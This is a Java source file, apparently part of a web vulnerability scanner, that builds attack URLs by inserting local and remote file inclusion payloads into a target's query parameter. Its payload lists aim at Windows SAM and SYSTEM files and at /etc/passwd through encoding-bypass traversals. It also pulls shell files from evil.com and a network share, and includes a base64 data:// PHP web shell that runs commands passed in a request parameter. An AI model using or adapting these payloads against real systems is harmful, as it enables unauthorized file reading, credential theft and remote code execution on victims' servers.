/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package multiweb;

import java.io.UnsupportedEncodingException;
import java.net.URL;
import java.net.URLDecoder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.regex.Pattern;
import org.omg.CORBA.NameValuePair;

/**
 *
 * @author kyawmt
 */
public class lfi {
//    public static Map<String, String> getQueryMap(String query)  
//{  
//    String[] params = query.split("&");  
//    Map<String, String> map = new HashMap<String, String>();  
//    for (String param : params)  
//    {  
//        String name = param.split("=")[0];  
//        String value = param.split("=")[1];  
//        map.put(name, value);  
//    }  
//    return map;  
//}
public static Map<String, String> splitQuery(URL url, String param, int option) throws UnsupportedEncodingException {

    Map<String, String> query_pairs = new LinkedHashMap<String, String>();
    String[] windows = {"../../../../../../WINDOWS/repair/sam","../../../../../../WINDOWS/repair/system"}; 
    String[] absoluteurl;
    String parameter = "";
    String query = url.getQuery();
    String urltostring;
    urltostring = url.toString();
    absoluteurl = urltostring.split("\\?");
    String[] pairs = query.split("&");
    for (String pair : pairs) {
        int idx = pair.indexOf("=");
        query_pairs.put(URLDecoder.decode(pair.substring(0, idx), "UTF-8"), URLDecoder.decode(pair.substring(idx + 1), "UTF-8"));  
    }
    if(query_pairs.containsKey(param)){
        if(option == 0)
            query_pairs.put(param, windows[0]);
        
    }
    if(option == 1){
        query_pairs.put(param, windows[1]);
    }
    System.out.println(query_pairs);
    Set<String> keys = query_pairs.keySet();
    parameter += absoluteurl[0]+"?";
    for(String k:keys){
            parameter += k+"="+query_pairs.get(k)+"&";
//            System.out.println(absoluteurl[0]+"?"+k+"="+query_pairs.get(k)+"&");
        }
    LinkedHashMap lhm = new LinkedHashMap();
    String lfioutput = parameter.substring(0, parameter.length() - 1);
    lhm.put("url", lfioutput);
    return lhm;
}

public static Map<String, String> linuxsplitQuery(URL url, String param, int option) throws UnsupportedEncodingException {

    Map<String, String> query_pairs = new LinkedHashMap<String, String>();
    String[] windows = {"../../../etc/passwd","../../../etc/passwd%00", "%252e%252e%252fetc%252fpasswd", "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "....//....//etc/passwd","..///////..////..//////etc/passwd", "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd", "http://evil.com/shell.txt", "http://evil.com/shell.txt%00", "http:%252f%252fevil.com%252fshell.txt", "\\\\10.0.0.1\\share\\shell.php","pHp://FilTer/convert.base64-encode/resource=index.php", "zip://shell.jpg%23payload.php", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=", "expect://id"};
    String[] absoluteurl;
    String parameter = "";
    String query = url.getQuery();
    String urltostring;
    urltostring = url.toString();
    absoluteurl = urltostring.split("\\?");
    String[] pairs = query.split("&");
    for (String pair : pairs) {
        int idx = pair.indexOf("=");
        query_pairs.put(URLDecoder.decode(pair.substring(0, idx), "UTF-8"), URLDecoder.decode(pair.substring(idx + 1), "UTF-8"));  
    }
    if(query_pairs.containsKey(param)){
        switch(option){
            case 0: query_pairs.put(param, windows[0]);break;
            case 1: query_pairs.put(param, windows[1]);break;
            case 2: query_pairs.put(param, windows[2]);break;
            case 3: query_pairs.put(param, windows[3]);break;
            case 4: query_pairs.put(param, windows[4]);break;
            case 5: query_pairs.put(param, windows[5]);break;
            case 6: query_pairs.put(param, windows[6]);break;
            case 7: query_pairs.put(param, windows[7]);break;
            case 8: query_pairs.put(param, windows[8]);break;
            case 9: query_pairs.put(param, windows[9]);break;
            case 10: query_pairs.put(param, windows[10]);break;
            case 11: query_pairs.put(param, windows[11]);break;
            case 12: query_pairs.put(param, windows[12]);break;
            case 13: query_pairs.put(param, windows[13]);break;
            case 14: query_pairs.put(param, windows[14]);break;
        }
//        if(option == 0)
//            query_pairs.put(param, windows[0]);
//        if(option == 1)
//            query_pairs.put(param, windows[1]);

    }
    System.out.println(query_pairs); 
    Set<String> keys = query_pairs.keySet();
    parameter += absoluteurl[0]+"?";
    for(String k:keys){
            parameter += k+"="+query_pairs.get(k)+"&";
//            System.out.println(absoluteurl[0]+"?"+k+"="+query_pairs.get(k)+"&");
        }
    LinkedHashMap lhm = new LinkedHashMap();
    String lfioutput = parameter.substring(0, parameter.length() - 1);
    lhm.put("url", lfioutput);
    return lhm;
}
}
